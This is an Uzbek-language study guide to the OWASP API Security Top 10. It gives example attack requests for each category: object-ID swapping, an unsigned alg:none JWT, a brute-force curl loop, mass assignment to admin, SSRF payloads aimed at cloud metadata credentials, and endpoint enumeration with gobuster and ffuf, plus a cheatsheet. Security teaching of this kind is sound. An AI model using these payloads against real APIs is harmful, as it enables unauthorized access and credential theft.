# 🔌 OWASP API Security Top 10 (API Xavfsizligi)

> **Maqsad:** API lardagi eng keng tarqalgan 10 ta zaiflikni tushunish va ularni qanday topish/himoya qilishni o'rganish.

---

## 📖 API nima?

**API (Application Programming Interface — Dastur Interfeysi)** — dasturlar orasida ma'lumot almashish yo'li.

```
Brauzer/Mobil ilova → API → Ma'lumotlar bazasi

# Misol:
GET /api/v1/users/1  →  {"id":1,"name":"Admin","email":"admin@site.com"}
POST /api/v1/login   →  {"token":"eyJhbGc..."}
```

---

## 🔟 OWASP API Top 10 (2023)

### API1 — Broken Object Level Authorization (BOLA)
**IDOR ning API versiyasi** — ob'ekt ID sini o'zgartirib boshqa ma'lumotlarga kirish.

```http
# Asl so'rov:
GET /api/v1/users/1001/orders
Authorization: Bearer YOUR_TOKEN

# Hujum:
GET /api/v1/users/1002/orders
Authorization: Bearer YOUR_TOKEN
→ Boshqa foydalanuvchi buyurtmalari → BOLA!
```

---

### API2 — Broken Authentication (Buzilgan Autentifikatsiya)
```http
# Zaif JWT (imzosiz - alg:none):
Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# Brute force (rate limit yo'q):
POST /api/v1/login
{"username":"admin","password":"FUZZ"}
```

---

### API3 — Broken Object Property Level Authorization
```http
# Ortiqcha ma'lumot (Excessive Data Exposure):
GET /api/v1/user/profile
→ {"name":"John","role":"user","credit_card":"4111..."}
# role va credit_card ko'rinmasligi kerak!

# Mass Assignment:
PUT /api/v1/user/profile
{"name":"John","role":"admin"}
→ Agar server qabul qilsa → admin bo'ldik!
```

---

### API4 — Unrestricted Resource Consumption
```bash
# Rate limiting yo'q:
for i in {1..10000}; do
  curl -X POST /api/v1/login -d '{"user":"admin","pass":"test"}'
done
# OTP brute force, email spam, katta fayl yuklash
```

---

### API5 — Broken Function Level Authorization (BFLA)
```http
# Oddiy foydalanuvchi token bilan admin endpoint:
DELETE /api/v1/admin/users/1002
Authorization: Bearer USER_TOKEN

GET /api/v1/admin/all-users
POST /api/v1/admin/create-user
```

---

### API6 — Unrestricted Access to Sensitive Business Flows
```
# Misol: Cheklangan mahsulot
→ Ko'p bot akkaunt → har biri 1 ta sotib olish → resursni egallab olish

# Referral tizimi:
→ O'ziga o'zi referral → chegirma olish
```

---

### API7 — Server Side Request Forgery (SSRF)
```http
POST /api/v1/fetch-url
{"url": "http://169.254.169.254/latest/meta-data/"}
→ AWS metadata → IAM credentials!

{"url": "http://localhost:8080/admin"}
→ Ichki admin panel!
```

---

### API8 — Security Misconfiguration
```http
# Debug ma'lumotlari:
GET /api/v1/user?debug=true
→ SQL so'rovlar, parollar ko'rinib qoladi!

# Swagger/OpenAPI ochiq:
/api/docs
/swagger-ui.html
/api/openapi.json
→ Barcha endpoint lar ko'rinadi!

# CORS noto'g'ri:
Access-Control-Allow-Origin: *
```

---

### API9 — Improper Inventory Management
```http
# Zamonaviy (himoyalangan):
GET /api/v3/users/1

# Eski (himoyasiz, lekin ishlaydi):
GET /api/v1/users/1
GET /api/v2/users/1
GET /api/beta/users/1
GET /api/legacy/users/1
→ Eski versiyada autentifikatsiya yo'q!
```

---

### API10 — Unsafe Consumption of APIs
```
Sayt → Uchinchi tomon API → Zararli javob (XSS payload)
→ Sayt tekshirmaydi → XSS yoki injection!
```

---

## 🛠️ API Tekshirish

```bash
# Endpoint topish:
gobuster dir -u http://target.com/api -w wordlist.txt
ffuf -u http://target.com/api/FUZZ -w wordlist.txt

# Swagger topish:
/api/docs  /swagger-ui.html  /api/openapi.json

# API versiyalarini sinash:
/api/v1/  /api/v2/  /api/beta/  /api/legacy/
```

---

## 🎯 Tezkor Cheatsheet

```http
# BOLA:
GET /api/users/YOUR_ID → /api/users/1

# BFLA:
GET /api/admin/users   (oddiy token bilan)

# Mass Assignment:
{"name":"John","role":"admin","is_admin":true}

# SSRF:
{"url":"http://127.0.0.1/admin"}
{"url":"http://169.254.169.254/latest/meta-data/"}

# Eski versiya:
/api/v1/ → /api/legacy/

# Debug:
?debug=true  ?test=1  ?verbose=true
```

---

## 💡 Eslab Qolish Uchun

| # | Zaiflik | Kalit so'z |
|---|---------|------------|
| API1 | BOLA | ID o'zgartirish |
| API2 | Broken Auth | Zaif token, brute force |
| API3 | Property Auth | Mass assignment, ortiqcha ma'lumot |
| API4 | Rate Limit yo'q | Cheksiz so'rov |
| API5 | BFLA | Admin endpoint, oddiy token |
| API6 | Business Flow | Botlar, suiste'mol |
| API7 | SSRF | API orqali ichki so'rov |
| API8 | Misconfiguration | Swagger ochiq, CORS, debug |
| API9 | Eski versiya | /api/v1/, /api/legacy/ |
| API10 | Uchinchi tomon | Tekshirilmagan API javob |
